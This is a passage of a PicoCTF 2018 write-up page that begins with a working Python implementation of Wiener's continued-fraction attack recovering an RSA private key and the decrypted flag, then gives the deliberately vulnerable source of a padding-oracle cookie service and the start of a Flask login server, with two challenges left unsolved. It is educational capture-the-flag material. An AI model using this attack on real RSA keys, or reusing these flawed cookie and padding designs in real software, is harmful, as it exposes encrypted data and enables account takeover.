    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">'</span><span class="s">square root not defined for negative numbers</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nf">divmod</span><span class="p">(</span><span class="nf">bitlength</span><span class="p">(</span><span class="n">n</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">n</span><span class="o">//</span><span class="n">x</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
        <span class="k">if</span> <span class="n">y</span> <span class="o">&gt;=</span> <span class="n">x</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">x</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">y</span>


<span class="k">def</span> <span class="nf">is_perfect_square</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    If n is a perfect square it returns sqrt(n),

    otherwise returns -1
    </span><span class="sh">'''</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="mh">0xF</span>  <span class="c1"># last hexadecimal "digit"
</span>
    <span class="k">if</span> <span class="n">h</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">:</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>  <span class="c1"># return immediately in 6 cases out of 16.
</span>
    <span class="c1"># Take advantage of Boolean short-circuit evaluation
</span>    <span class="nf">if </span><span class="p">(</span><span class="n">h</span> <span class="o">!=</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">5</span> <span class="ow">and</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">6</span> <span class="ow">and</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">7</span> <span class="ow">and</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">):</span>
        <span class="c1"># take square root if you must
</span>        <span class="n">t</span> <span class="o">=</span> <span class="nf">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">t</span><span class="o">*</span><span class="n">t</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">t</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>


<span class="k">def</span> <span class="nf">rational_to_contfrac</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    Converts a rational x/y fraction into
    a list of partial quotients [a0, </span><span class="gp">...</span><span class="p">,</span> <span class="n">an</span><span class="p">]</span>
    <span class="sh">'''</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">x</span><span class="o">//</span><span class="n">y</span>
    <span class="n">pquotients</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span><span class="p">]</span>
    <span class="k">while</span> <span class="n">a</span> <span class="o">*</span> <span class="n">y</span> <span class="o">!=</span> <span class="n">x</span><span class="p">:</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span><span class="o">-</span><span class="n">a</span><span class="o">*</span><span class="n">y</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">x</span><span class="o">//</span><span class="n">y</span>
        <span class="n">pquotients</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">pquotients</span>


<span class="k">def</span> <span class="nf">convergents_from_contfrac</span><span class="p">(</span><span class="n">frac</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    computes the list of convergents
    using the list of partial quotients
    </span><span class="sh">'''</span>
    <span class="n">convs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">frac</span><span class="p">)):</span>
        <span class="n">convs</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">contfrac_to_rational</span><span class="p">(</span><span class="n">frac</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">i</span><span class="p">]))</span>
    <span class="k">return</span> <span class="n">convs</span>


<span class="k">def</span> <span class="nf">contfrac_to_rational</span><span class="p">(</span><span class="n">frac</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Converts a finite continued fraction [a0, </span><span class="gp">...</span><span class="p">,</span> <span class="n">an</span><span class="p">]</span>
     <span class="n">to</span> <span class="n">an</span> <span class="n">x</span><span class="o">/</span><span class="n">y</span> <span class="n">rational</span><span class="p">.</span>
     <span class="sh">'''</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">frac</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">return </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">num</span> <span class="o">=</span> <span class="n">frac</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">denom</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">frac</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">num</span><span class="p">,</span> <span class="n">denom</span> <span class="o">=</span> <span class="n">frac</span><span class="p">[</span><span class="n">_</span><span class="p">]</span><span class="o">*</span><span class="n">num</span><span class="o">+</span><span class="n">denom</span><span class="p">,</span> <span class="n">num</span>
    <span class="nf">return </span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">denom</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">bitlength</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    Calculates the bitlength of x
    </span><span class="sh">'''</span>
    <span class="k">assert</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="mi">0</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">n</span><span class="o">+</span><span class="mi">1</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">n</span>


<span class="k">def</span> <span class="nf">hack_RSA</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    Finds d knowing (e,n)
    applying the Wiener continued fraction attack
    </span><span class="sh">'''</span>
    <span class="n">frac</span> <span class="o">=</span> <span class="nf">rational_to_contfrac</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="n">convergents</span> <span class="o">=</span> <span class="nf">convergents_from_contfrac</span><span class="p">(</span><span class="n">frac</span><span class="p">)</span>

    <span class="nf">for </span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span> <span class="ow">in</span> <span class="n">convergents</span><span class="p">:</span>

        <span class="c1"># check if d is actually the key
</span>        <span class="k">if</span> <span class="n">k</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">e</span><span class="o">*</span><span class="n">d</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">e</span><span class="o">*</span><span class="n">d</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="n">k</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="n">phi</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="c1"># check if the equation x^2 - s*x + n = 0
</span>            <span class="c1"># has integer roots
</span>            <span class="n">discr</span> <span class="o">=</span> <span class="n">s</span><span class="o">*</span><span class="n">s</span> <span class="o">-</span> <span class="mi">4</span><span class="o">*</span><span class="n">n</span>
            <span class="nf">if</span><span class="p">(</span><span class="n">discr</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">):</span>
                <span class="n">t</span> <span class="o">=</span> <span class="nf">is_perfect_square</span><span class="p">(</span><span class="n">discr</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">t</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">t</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hacked!</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">d</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">62521990254455432739739098327679950602675797333442676086848188780355806233664586212815747058830242509072941471918606448376223071702950597243409185734520501054880754651705541198856749099694484071501292887111220558418712756088261843103763153296918795811242273836779338023623847026392962143077450363442487934689</span>
    <span class="n">e</span> <span class="o">=</span> <span class="mi">11376394003149076634899198125602078382240701942434104587266195449986160326784109595920286001442706286840942170874916183177235151594636401912319064648735169214636981775404170094629988884687077578483030764227613917415801022670556750159920041801902797676162135948461328656879638396798506273263833645665345860373</span>
    <span class="n">c</span> <span class="o">=</span> <span class="mi">25768046345727464502597520221366212769169471825365967634630931748647232910338751793422711728554855006367814407810621525958992286707789113053995635463407498955539964935155035496760107228272520704862671855993478994453136635235568232731879221074380473331175949428476338755714015215366964946019773206537518303256</span>

    <span class="c1"># find d using wieners algorithm
</span>    <span class="n">d</span> <span class="o">=</span> <span class="nf">hack_RSA</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

    <span class="c1"># use d to decrypt message
</span>    <span class="n">pt</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">((</span><span class="n">pt</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">reversed</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))]))</span>
</pre></table></code></div></div><p>when we run this we get the flag:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python supersafersa2.py
Hacked!
65537
264003602020102370693041857442610586342633199683725005643958437442448465210344626586049655752028764806997162365
picoCTF<span class="o">{</span>w@tch_y0ur_Xp0n3nt<span class="nv">$_c</span>@r3fu11y_6498999<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{w@tch_y0ur_Xp0n3nt$_c@r3fu11y_6498999} </code><hr><h1 id="cryptography-450-magic-padding-oracle"> Cryptography 450: Magic Padding Oracle <a href="/CTF-writeups-public/writeups/PicoCTF_2018/80-cryptography-450-magic-padding-oracle.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you help us retreive the flag from this crypto service?</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 4966</code>.</p><p>We were able to recover some <a href="writeupfiles/pkcs7.py">Source Code</a>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="n">cookiefile</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">cookie</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">flag</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">key</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">key</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>

<span class="n">welcome</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
Welcome to Secure Encryption Service version 1.1
</span><span class="sh">"""</span>
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="nf">chr</span><span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">isvalidpad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="k">return</span> <span class="nf">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">*</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span><span class="o">==</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]):]</span>

<span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:])]</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
  <span class="n">IV</span><span class="o">=</span><span class="sh">"</span><span class="s">This is an IV456</span><span class="sh">"</span>
  <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">IV</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">hex</span><span class="sh">"</span><span class="p">)</span><span class="o">+</span><span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">m</span><span class="p">)).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">hex</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
  <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">32</span><span class="p">].</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">hex</span><span class="sh">"</span><span class="p">))</span>
  <span class="k">return</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">32</span><span class="p">:].</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">hex</span><span class="sh">"</span><span class="p">))</span>


<span class="c1"># flush output immediately
</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">print</span> <span class="n">welcome</span>
<span class="k">print</span> <span class="sh">"</span><span class="s">Here is a sample cookie: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">cookiefile</span><span class="p">)</span>

<span class="c1"># Get their cookie
</span><span class="k">print</span> <span class="sh">"</span><span class="s">What is your cookie?</span><span class="sh">"</span>
<span class="n">cookie2</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
<span class="c1"># decrypt, but remove the trailing newline first
</span><span class="n">cookie2decoded</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cookie2</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="k">if</span> <span class="nf">isvalidpad</span><span class="p">(</span><span class="n">cookie2decoded</span><span class="p">):</span>
   <span class="n">d</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nf">unpad</span><span class="p">(</span><span class="n">cookie2decoded</span><span class="p">))</span>
   <span class="k">print</span> <span class="sh">"</span><span class="s">username: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">d</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span>
   <span class="k">print</span> <span class="sh">"</span><span class="s">Admin? </span><span class="sh">"</span> <span class="o">+</span> <span class="n">d</span><span class="p">[</span><span class="sh">"</span><span class="s">is_admin</span><span class="sh">"</span><span class="p">]</span>
   <span class="n">exptime</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="sh">"</span><span class="s">expires</span><span class="sh">"</span><span class="p">],</span><span class="sh">"</span><span class="s">%Y-%m-%d</span><span class="sh">"</span><span class="p">)</span>
   <span class="k">if</span> <span class="n">exptime</span> <span class="o">&gt;</span> <span class="n">time</span><span class="p">.</span><span class="nf">localtime</span><span class="p">():</span>
      <span class="k">print</span> <span class="sh">"</span><span class="s">Cookie is not expired</span><span class="sh">"</span>
   <span class="k">else</span><span class="p">:</span>
      <span class="k">print</span> <span class="sh">"</span><span class="s">Cookie is expired</span><span class="sh">"</span>
   <span class="k">if</span> <span class="n">d</span><span class="p">[</span><span class="sh">"</span><span class="s">is_admin</span><span class="sh">"</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">exptime</span> <span class="o">&gt;</span> <span class="n">time</span><span class="p">.</span><span class="nf">localtime</span><span class="p">():</span>
      <span class="k">print</span> <span class="sh">"</span><span class="s">The flag is: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">flag</span>
<span class="k">else</span><span class="p">:</span>
   <span class="k">print</span> <span class="sh">"</span><span class="s">invalid padding</span><span class="sh">"</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="binary-exploitation-450-buffer-overflow-3"> Binary Exploitation 450: buffer overflow 3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/81-binary-exploitation-450-buffer-overflow-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It looks like Dr. Xernon added a stack canary to <a href="./writeupfiles/vuln-buff-overflow-3">this program</a> to protect against buffer overflows. Do you think you can bypass the protection and get the flag? You can find it in /problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce. <a href="./writeupfiles/vuln-buff-overflow-3.c">Source.</a></p><h2 id="hints"><span class="mr-2">Hints</span><a href="#hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Maybe there’s a smart way to brute-force the canary?</ul><p><strong>Solution</strong><br /> I really don’t know what to do for this one. That’s 4 bytes, large number of<br /> options. You can’t <code class="language-plaintext highlighter-rouge">gdb</code> this live, I don’t think it’s possible to do timing<br /> based attacks to guess digits. So… ???</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="web-exploitation-500-secure-logon"> Web Exploitation 500: Secure Logon <a href="/CTF-writeups-public/writeups/PicoCTF_2018/82-web-exploitation-500-secure-logon.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Uh oh, the login page is more secure… I think. http://2018shell1.picoctf.com:46026 (link).</p><p><a href="writeupfiles/server_noflag.py">Source</a></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="n">Crypto</span> <span class="kn">import</span> <span class="n">Random</span>
<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">seed removed</span><span class="sh">'</span>
<span class="n">flag_value</span> <span class="o">=</span> <span class="sh">'</span><span class="s">flag removed</span><span class="sh">'</span>

<span class="n">BLOCK_SIZE</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># Bytes
</span><span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="n">BLOCK_SIZE</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BLOCK_SIZE</span><span class="p">)</span> <span class="o">*</span> \
                <span class="nf">chr</span><span class="p">(</span><span class="n">BLOCK_SIZE</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BLOCK_SIZE</span><span class="p">)</span>
<span class="n">unpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:])]</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">message</span> <span class="o">=</span> <span class="sh">"</span><span class="s">I</span><span class="sh">'</span><span class="s">m sorry the admin password is super secure. You</span><span class="sh">'</span><span class="s">re not getting in that way.</span><span class="sh">"</span>
        <span class="n">category</span> <span class="o">=</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span>
        <span class="nf">flash</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">category</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">))</span>

    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">cookie</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
